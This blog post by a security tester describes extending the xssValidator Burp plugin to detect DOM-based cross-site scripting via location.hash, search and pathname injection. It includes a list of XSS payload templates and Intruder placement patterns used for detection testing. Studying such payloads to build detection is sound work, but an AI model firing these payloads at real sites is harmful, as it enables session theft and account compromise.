Few days ago my team colleague (regards Jerzy!) told me to check out the new interesting Burp Plugin; nVision xssValidator (https://github.com/nVisium/xssValidator). As the Additional Scanner Checks plugin for burp has only basic grep feature against the JS code (https://code.google.com/p/domxsswiki/wiki/FindingDOMXSS) - which is far from being a source code analysis tool - I thought that a plugin with its own browser that builds DOM and executes JavaScript will be a much more accurate solution. I already had few test HTML pages with JavaScript for this purpose.
As of writing this (13.09.2014), the master xssValidator branch uses the response delivered by Intruder (the actual response sent by the HTTP server hosting the original application we test) in order to deliver it to at least one of the headless webkit servers (phantomjs/slimerjs) so they build the DOM, execute the JavaScript which will, eventually, trigger one of the plugin payloads. The only problem with this approach is when only application response is delivered, most of purely DOM based Cross Site Scripting (with location.pathname, location.hash and location.search injection points) will not reach the testing JS sandbox because there is no original intruder request data delivered.
So I took the source code and I modified it so it uses both the original request and response to make my test cases start working. Although the original URL was being delivered correctly, the location.* elements were still empty. I contacted with John Poulin, the lead developer - sharing my current concept, work and unsuccessful test result. He turned out to be very eager to introduce these changes into the development branch. He also explained to me the reason my current set was still not working; the JavaScript context of the application (server) we run on phantomjs is a separate context from the one of phantomjs browser object's. He introduced my changes plus his change into the xss.js so it passes the URL data to the context where our payloads are about to be executed - and bingo, it started to work. I also built my own payloads list (focusing on eval injection as well, not only on tag injection), then I also implemented and tested error based detection feature into the plugin (for nested, weird injection points, especially in callback definitions it will be lot easier to trigger an error than to come up with a comprehensive list of paylods where at least one of which will result in immediate trigger execution (alert/prompt/etc.).
Then I extedned the test set, distinguishing different DOM based scenarios:

Payload type:
1. HTML tag injcetion with JS code (.replace,.innerHTML, document.write etc)
2. JS injection (eval)

Quoting type to escape:
1. no quotes (like eval(user_controlled)/document.write(user_controlled)
2. single quotes (like eval("'"+user_controlled+"'")/document.write("'"+user_controlled+"'")
3. double quotes (like eval('"'+user_controlled+'"')/document.write('"'+user_controlled+'"')

INJECTION POINTS:
1) location.hash
2) location.search 
3) location.pathname 

The last one (pathname) is especially interesting, while few know that it should be sanitized on the JS side too. With usual URL, like http://localhost/domhell/foo.php?var=val the pathname will be /domhell/foo.php, so it seems there is no way a malicious input could reside in that value since it consists of the document root relative file path we just received our document from, right? Depending on the server side platform, there is still some space for abuse. This usually has been used to bypass WAF-s, but it can also be used for XSS exploitation.
In PHP the pathinfo also comprises anything before the ? (location.search (aka QUERY_STRING) starting delimiter) and the requested filename, if that additional content is prefixed with '/' sign. So, the http://localhost/domhell/foo.php/someevilstuff;?var=val will also take us to the foo.php, but now the pathinfo parameter will differ and equal to /domhell/foo.php/someevilstuff;.
In JSP the additional pathinfo section starting delimier is ;. For PHP it's /. I am not sure how it looks like on other platforms.

Combination of all these peculiarities resulted in the test set growing to 17 files already (https://github.com/ewilded/xssValidatorTestCases).

And here is my test payloads list:

";{JAVASCRIPT};"
';{JAVASCRIPT};'
;{JAVASCRIPT};
";{JAVASCRIPT}//
';{JAVASCRIPT}//
1;{JAVASCRIPT}//
;{JAVASCRIPT}//
1jsadif;
'1jsadif;
';1jsadif;
<script>{JAVASCRIPT}</script>
"><script>{JAVASCRIPT}</script>
'><script>{JAVASCRIPT}</script>
<img src="1" onerror="{JAVASCRIPT}">
<img src="1" onerror="{JAVASCRIPT}"
<img src='1' onerror='{JAVASCRIPT}'>
<img src='1' onerror='{JAVASCRIPT}'
<img src=1 onerror={JAVASCRIPT}
<img src=1 onerror={JAVASCRIPT}//
"><img src="1" onerror="{JAVASCRIPT}">
"><img src="1" onerror="{JAVASCRIPT}"
'><img src='1' onerror='{JAVASCRIPT}'>
'><img src='1' onerror='{JAVASCRIPT}'
onerror="{JAVASCRIPT}"
onerror='{JAVASCRIPT}'
onload="{JAVASCRIPT}"
onload='{JAVASCRIPT}'
" onerror="{JAVASCRIPT}"
" onload="{JAVASCRIPT}"
' onerror='{JAVASCRIPT}'
' onload='{JAVASCRIPT}'


Now, how the payloads should be placed in Intruder:
For all pathname tests (in case of JSP instead of / we would use ;) :		GET /path_to_file.php/§PAYLOAD§ HTTP/1.1
For all hash tests													:		GET /path_to_file.html#§PAYLOAD§ HTTP/1.1
For all search tests												:		GET /path_to_file.html?var=§PAYLOAD§ HTTP/1.1

During the tests URL encoding in Intruder was off.
The http server used was apache2+php5 on KALI.

Here is the summary of test cases along with their status under particular browsers (NOTOK means that no single payload has fired successfully, while OK means that at least one did):
https://github.com/ewilded/xssValidatorTestCases/blob/master/test_results.csv


Conclusion: we have no impact on how particular browsers and httpds handle data, nevertheless in order to gain highest overall XSS detection accuracy, our goal is to make our JS servers (phantomjs (Webkit), slimerjs (Gecko) and triflejs (IE)) attached to xssValidator & Burp Intruder to summary cover as much [OK]-s from that list as possible.
By now we have 7 types of XSS that will work under IE and will still not be detected with this toolset, hopefully with:
- some tuning
- employment of other browse engines
we will get the summary undetectable case rate close to 0 :D



URLS
https://github.com/nVisium/xssValidator
https://github.com/ewilded/xssValidatorTestCases
http://triflejs.org/
http://slimerjs.org/
http://phantomjs.org/
https://code.google.com/p/domxsswiki/wiki/FindingDOMXSS



First real world issues noticed: 
- phantomjs has problems with jquery
